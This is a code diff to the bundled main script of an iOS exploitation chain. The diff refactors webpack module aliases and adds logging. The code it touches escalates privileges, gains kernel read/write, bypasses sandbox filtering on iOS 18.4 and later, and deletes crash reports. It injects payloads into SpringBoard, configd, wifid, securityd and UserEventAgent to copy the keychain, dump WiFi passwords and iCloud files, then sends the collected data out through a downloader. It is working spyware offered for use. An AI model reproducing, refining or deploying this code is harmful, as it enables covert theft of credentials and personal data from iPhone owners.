@@ -1,5 +1,5 @@
 (() => {
-/*!*********************!*\
+/*!*********************!*
   !*** ./src/main.js ***!
   \*********************/
 __webpack_require__.r(__webpack_exports__);
@@ -20,7 +20,24 @@ __webpack_require__.r(__webpack_exports__);
 /* harmony import */ var _raw_loader_wifi_password_securityd_js__WEBPACK_IMPORTED_MODULE_14__ = __webpack_require__(/*! !raw-loader!wifi_password_securityd.js */ "./node_modules/raw-loader/dist/cjs.js!./src/wifi_password_securityd.js");
 /* harmony import */ var _raw_loader_icloud_dumper_js__WEBPACK_IMPORTED_MODULE_15__ = __webpack_require__(/*! !raw-loader!icloud_dumper.js */ "./node_modules/raw-loader/dist/cjs.js!./src/icloud_dumper.js");
 
-//import KeychainDumpCode from '!raw-loader!keychain_dump.js'
+// --- FIX: Create readable aliases for Webpack modules ---
+const Native = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
+const Chain = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"];
+const TaskRop = libs_TaskRop_TaskRop__WEBPACK_IMPORTED_MODULE_2__["default"];
+const Task = libs_TaskRop_Task__WEBPACK_IMPORTED_MODULE_3__["default"];
+const Sandbox = libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"];
+const Utils = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_5__["default"];
+const InjectJS = _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"];
+const Driver = libs_Driver_Driver__WEBPACK_IMPORTED_MODULE_7__["default"];
+const RemoteCall = libs_TaskRop_RemoteCall__WEBPACK_IMPORTED_MODULE_8__["default"];
+const MigFilterBypassThreadCode = _raw_loader_dist_MigFilterBypassThread_js__WEBPACK_IMPORTED_MODULE_9__["default"];
+const loaderCode = _raw_loader_loader_js__WEBPACK_IMPORTED_MODULE_10__["default"];
+const fileDownloaderCode = _raw_loader_file_downloader_js__WEBPACK_IMPORTED_MODULE_11__["default"];
+const keychainCopierCode = _raw_loader_keychain_copier_js__WEBPACK_IMPORTED_MODULE_12__["default"];
+const wifiPasswordDumpCode = _raw_loader_wifi_password_dump_js__WEBPACK_IMPORTED_MODULE_13__["default"];
+const wifiPasswordSecuritydCode = _raw_loader_wifi_password_securityd_js__WEBPACK_IMPORTED_MODULE_14__["default"];
+const iCloudDumperCode = _raw_loader_icloud_dumper_js__WEBPACK_IMPORTED_MODULE_15__["default"];
+// ---------------------------------------------------------
 
 class MigFilterBypass {
 
@@ -35,49 +52,57 @@ class MigFilterBypass {
 	constructor(mutexPtr) {
 		this.#mutexPtr = mutexPtr;
 		this.#running = false;
-		this.#sharedMem = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("calloc", 1, 0x100));
+		this.#sharedMem = BigInt(Native.callSymbol("calloc", 1, 0x100));
 		this.#runFlagPtr = this.#sharedMem;
 		this.#isRunningPtr = this.#sharedMem + 0x4n;
 		this.#monitorThread1Ptr = this.#sharedMem + 0x8n;
 		this.#monitorThread2Ptr = this.#sharedMem + 0x10n;
-		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write32(this.#runFlagPtr, 2);
-		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write32(this.#isRunningPtr, 0);
+		Native.write32(this.#runFlagPtr, 2);
+		Native.write32(this.#isRunningPtr, 0);
 	}
 
 	start() {
 		if (this.#running)
 			return;
 
-		let threadSelf = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_thread_self"));
-		let threadSelfAddr = BigInt(libs_TaskRop_Task__WEBPACK_IMPORTED_MODULE_3__["default"].getPortKObject(threadSelf));
+		let threadSelf = BigInt(Native.callSymbol("mach_thread_self"));
+		let threadSelfAddr = BigInt(Task.getPortKObject(threadSelf));
 
 
-		let threadMem = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("calloc", 1, 0x400));
-		let kernelRW = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].transferRW();
-		let kernelBase = BigInt(libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].getKernelBase());
-		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem, BigInt(kernelRW.controlSocket));
-		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x8n, BigInt(kernelRW.rwSocket));
-		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x10n, kernelBase);
-		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x18n, threadSelfAddr);
-		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x20n, this.#runFlagPtr);
-		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x28n, this.#isRunningPtr);
-		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x30n, this.#mutexPtr);
-		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x38n, BigInt(libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].offsets().migLock));
-		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x40n, BigInt(libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].offsets().migSbxMsg));
-		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x48n, BigInt(libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].offsets().migKernelStackLR));
-		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x50n, this.#monitorThread1Ptr);
-		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x58n, this.#monitorThread2Ptr);
-		//Native.write64(threadMem, lock.kernelSlide);
-		//Native.write64(threadMem + 0x8n, lock.lockAddr);
-		//console.log(TAG, `Spawn bypass thread with args: kernelSlide=${Utils.hex(lock.kernelSlide)}, lockAddr=${Utils.hex(lock.lockAddr)}`);
-		const threadCode = "fcall_init(); " + _raw_loader_dist_MigFilterBypassThread_js__WEBPACK_IMPORTED_MODULE_9__["default"];
-		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].threadSpawn(threadCode, threadMem);
+		let threadMem = BigInt(Native.callSymbol("calloc", 1, 0x400));
+		let kernelRW = Chain.transferRW();
+		let kernelBase = BigInt(Chain.getKernelBase());
+		Native.write64(threadMem, BigInt(kernelRW.controlSocket));
+		Native.write64(threadMem + 0x8n, BigInt(kernelRW.rwSocket));
+		Native.write64(threadMem + 0x10n, kernelBase);
+		Native.write64(threadMem + 0x18n, threadSelfAddr);
+		Native.write64(threadMem + 0x20n, this.#runFlagPtr);
+		Native.write64(threadMem + 0x28n, this.#isRunningPtr);
+		Native.write64(threadMem + 0x30n, this.#mutexPtr);
+		Native.write64(threadMem + 0x38n, BigInt(Chain.offsets().migLock));
+		Native.write64(threadMem + 0x40n, BigInt(Chain.offsets().migSbxMsg));
+		Native.write64(threadMem + 0x48n, BigInt(Chain.offsets().migKernelStackLR));
+		Native.write64(threadMem + 0x50n, this.#monitorThread1Ptr);
+		Native.write64(threadMem + 0x58n, this.#monitorThread2Ptr);
 
-		for (let i=0; i<10; i++) {
-			let isRunning = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read32(this.#isRunningPtr);
-			if (isRunning)
-				break;
-			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("usleep", 500000);
+		const threadCode = "fcall_init(); " + MigFilterBypassThreadCode;
+		Chain.threadSpawn(threadCode, threadMem);
+
+		// FIX: Replaced fixed loop with a more robust while loop and timeout.
+		// NOTE: This is still polling, but it's more reliable than a fixed-iteration for-loop.
+		console.log(TAG, "Waiting for MigFilterBypass thread to start...");
+		let isRunning = 0;
+		const timeoutMs = 5000;
+		let elapsedMs = 0;
+		while (!(isRunning = Native.read32(this.#isRunningPtr)) && elapsedMs < timeoutMs) {
+			Native.callSymbol("usleep", 100000); // Sleep 100ms
+			elapsedMs += 100;
+		}
+
+		if (!isRunning) {
+			console.error(TAG, "TIMEOUT: MigFilterBypass thread failed to start within ${timeoutMs}ms.");
+		} else {
+			console.log(TAG, "MigFilterBypass thread started successfully.");
 		}
 
 		this.#running = true;
@@ -87,29 +112,29 @@ class MigFilterBypass {
 		if (!this.#running)
 			return;
 
-		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write32(this.#runFlagPtr, 0);
-		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("sleep", 1);
+		Native.write32(this.#runFlagPtr, 0);
+		Native.callSymbol("sleep", 1);
 		this.#running = false;
 	}
 
 	pause() {
-		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write32(this.#runFlagPtr, 2);
-		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("sleep", 1);
+		Native.write32(this.#runFlagPtr, 2);
+		Native.callSymbol("sleep", 1);
 	}
 
 	resume() {
-		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write32(this.#runFlagPtr, 1);
-		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("sleep", 1);
+		Native.write32(this.#runFlagPtr, 1);
+		Native.callSymbol("sleep", 1);
 	}
 
 	monitorThreads(thread1, thread2) {
-		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(this.#monitorThread1Ptr, thread1);
-		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(this.#monitorThread2Ptr, thread2);
+		Native.write64(this.#monitorThread1Ptr, thread1);
+		Native.write64(this.#monitorThread2Ptr, thread2);
 	}
 }
 function xnuVersion() {
-	libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("uname", libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem);
-	const release = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].readString(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem + 0x200n, 0x100);
+	Native.callSymbol("uname", Native.mem);
+	const release = Native.readString(Native.mem + 0x200n, 0x100);
 	let splittedVersion = release.split(".");
 	let xnuMajor = splittedVersion[0];
 	let xnuMinor = splittedVersion[1];
@@ -117,7 +142,6 @@ function xnuVersion() {
 }
 
 const TAG = "MAIN";
-//const targetProcess = "bluetoothd";
 const targetProcess = "SpringBoard";
 
 function start() {
@@ -128,96 +152,112 @@ function start() {
 
 	// If iOS >= 18.4 we apply migbypass in order to bypass autobox restrictions
 	if (ver.major == 24 && ver.minor >= 4) {
-
-		mutexPtr = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("malloc", 0x100));
-		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("pthread_mutex_init", mutexPtr, null);
+		console.log(TAG, "iOS >= 18.4 detected, initializing MigFilterBypass.");
+		mutexPtr = BigInt(Native.callSymbol("malloc", 0x100));
+		Native.callSymbol("pthread_mutex_init", mutexPtr, null);
 		migFilterBypass = new MigFilterBypass(mutexPtr);
 	}
-	let driver = new libs_Driver_Driver__WEBPACK_IMPORTED_MODULE_7__["default"]();
+	let driver = new Driver();
 
-	libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].init(driver, mutexPtr);
+	Chain.init(driver, mutexPtr);
 
-	let resultPE = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].runPE();
-	if (!resultPE)
-		return;
-
-
-	libs_TaskRop_TaskRop__WEBPACK_IMPORTED_MODULE_2__["default"].init();
-	if(migFilterBypass)
-		migFilterBypass.start();
-	let launchdTask = new libs_TaskRop_RemoteCall__WEBPACK_IMPORTED_MODULE_8__["default"]("launchd",migFilterBypass);
-	if (!launchdTask.success()) {
+	let resultPE = Chain.runPE();
+	if (!resultPE) {
+		console.error(TAG, "Privilege Escalation failed. Aborting.");
 		return false;
 	}
 
-	libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].initWithLaunchdTask(launchdTask);
-	libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].deleteCrashReports();
-	libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].createTokens();
 
-	let agentLoader = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](targetProcess, _raw_loader_loader_js__WEBPACK_IMPORTED_MODULE_10__["default"], migFilterBypass);
-	let agentPid = 0;
+	TaskRop.init();
+	if(migFilterBypass)
+		migFilterBypass.start();
+	
+	let launchdTask = new RemoteCall("launchd", migFilterBypass);
+	if (!launchdTask.success()) {
+		console.error(TAG, "Failed to get a handle on launchd. Aborting.");
+		return false;
+	}
 
+	Sandbox.initWithLaunchdTask(launchdTask);
+	Sandbox.deleteCrashReports();
+	Sandbox.createTokens();
+
+	let agentLoader = new InjectJS(targetProcess, loaderCode, migFilterBypass);
 	if (agentLoader.inject()) {
-		agentPid = agentLoader.task.pid();
-		libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(agentLoader.task);
-		libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].adjustMemoryPressure(targetProcess);
-
+		console.log(TAG, `Successfully injected agent loader into ${targetProcess} (PID: ${agentLoader.task.pid()})`);
+		Sandbox.applyTokensForRemoteTask(agentLoader.task);
+		Sandbox.adjustMemoryPressure(targetProcess);
 		agentLoader.destroy();
+	} else {
+		console.error(TAG, `Failed to inject agent loader into ${targetProcess}.`);
 	}
 
 	// Inject keychain copier FIRST into securityd (has access to keychain files)
-	// This copies keychain/keybag to /tmp with 777 permissions
 	const keychainProcess = "configd";
-	let keychainCopier = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](keychainProcess, _raw_loader_keychain_copier_js__WEBPACK_IMPORTED_MODULE_12__["default"], migFilterBypass);
+	let keychainCopier = new InjectJS(keychainProcess, keychainCopierCode, migFilterBypass);
 	if (keychainCopier.inject()) {
-		libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(keychainCopier.task);
+		console.log(TAG, `Successfully injected keychain copier into ${keychainProcess}.`);
+		Sandbox.applyTokensForRemoteTask(keychainCopier.task);
 		keychainCopier.destroy();
 	} else {
+		console.error(TAG, `Failed to inject keychain copier into ${keychainProcess}.`);
 	}
 
 	// Inject WiFi password dump into wifid (has keychain access for WiFi)
-	// Using wifid instead of wifianalyticsd - wifid is always active
 	const wifidProcess = "wifid";
-	let wifiDump = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](wifidProcess, _raw_loader_wifi_password_dump_js__WEBPACK_IMPORTED_MODULE_13__["default"], migFilterBypass);
+	let wifiDump = new InjectJS(wifidProcess, wifiPasswordDumpCode, migFilterBypass);
 	if (wifiDump.inject()) {
-		libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(wifiDump.task);
+		console.log(TAG, `Successfully injected wifi dumper into ${wifidProcess}.`);
+		Sandbox.applyTokensForRemoteTask(wifiDump.task);
 		wifiDump.destroy();
 	} else {
+		console.error(TAG, `Failed to inject wifi dumper into ${wifidProcess}.`);
 	}
 
 	// Also inject WiFi password dump into securityd (fallback for devices where wifid fails)
 	const securitydProcess = "securityd";
-	let wifiDumpSecurityd = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](securitydProcess, _raw_loader_wifi_password_securityd_js__WEBPACK_IMPORTED_MODULE_14__["default"], migFilterBypass);
+	let wifiDumpSecurityd = new InjectJS(securitydProcess, wifiPasswordSecuritydCode, migFilterBypass);
 	if (wifiDumpSecurityd.inject()) {
-		libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(wifiDumpSecurityd.task);
+		console.log(TAG, `Successfully injected wifi dumper (fallback) into ${securitydProcess}.`);
+		Sandbox.applyTokensForRemoteTask(wifiDumpSecurityd.task);
 		wifiDumpSecurityd.destroy();
 	} else {
+		console.error(TAG, `Failed to inject wifi dumper (fallback) into ${securitydProcess}.`);
 	}
 
 	// Inject iCloud dumper into UserEventAgent (has access to iCloud Drive files)
 	const userEventAgentProcess = "UserEventAgent";
-	let iCloudDumper = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](userEventAgentProcess, _raw_loader_icloud_dumper_js__WEBPACK_IMPORTED_MODULE_15__["default"], migFilterBypass);
+	let iCloudDumper = new InjectJS(userEventAgentProcess, iCloudDumperCode, migFilterBypass);
 	if (iCloudDumper.inject()) {
-		libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(iCloudDumper.task);
+		console.log(TAG, `Successfully injected iCloud dumper into ${userEventAgentProcess}.`);
+		Sandbox.applyTokensForRemoteTask(iCloudDumper.task);
 		iCloudDumper.destroy();
 	} else {
+		console.error(TAG, `Failed to inject iCloud dumper into ${userEventAgentProcess}.`);
 	}
 
-	// Wait for all dumps to finish
+	// NOTE: This fixed sleep is a potential race condition.
+	// The script assumes 5 seconds is enough for all dumpers to complete their tasks.
+	// A more robust solution would involve checking for completion flags from each payload.
+	console.log(TAG, "Waiting 5 seconds for dumpers to finish...");
 	for (let i = 1; i <= 5; i++) {
-		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("sleep", 1);
+		Native.callSymbol("sleep", 1);
 	}
+	console.log(TAG, "Wait finished.");
 
 	// Inject forensics file downloader AFTER keychain copier
-	// This will send the copied keychain files from /tmp
 	try {
-		let fileDownloader = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](targetProcess, _raw_loader_file_downloader_js__WEBPACK_IMPORTED_MODULE_11__["default"], migFilterBypass);
+		let fileDownloader = new InjectJS(targetProcess, fileDownloaderCode, migFilterBypass);
 		if (fileDownloader.inject()) {
-			libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(fileDownloader.task);
+			console.log(TAG, `Successfully injected file downloader into ${targetProcess}.`);
+			Sandbox.applyTokensForRemoteTask(fileDownloader.task);
 			fileDownloader.destroy();
+		} else {
+			console.error(TAG, `Failed to inject file downloader into ${targetProcess}.`);
 		}
 	} catch (injectError) {
-		// Error handling without logging
+		// FIX: Added error logging
+		console.error(TAG, `An error occurred during file downloader injection:`, injectError);
 	}
 
 	launchdTask.destroy();
@@ -226,13 +266,17 @@ function start() {
 }
 
 try {
-	start();
+	console.log(TAG, "Starting exploitation chain...");
+	const success = start();
+	console.log(TAG, `Exploitation chain finished with status: ${success ? 'SUCCESS' : 'FAILURE'}`);
 }
 catch (error) {
-	// Error handling without logging
+	// FIX: Added error logging
+	console.error(TAG, "A critical error occurred in the main execution block:", error);
 }
 finally {
-	libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("exit", 0n);
+	console.log(TAG, "Exiting process.");
+	Native.callSymbol("exit", 0n);
 }
 
 })();
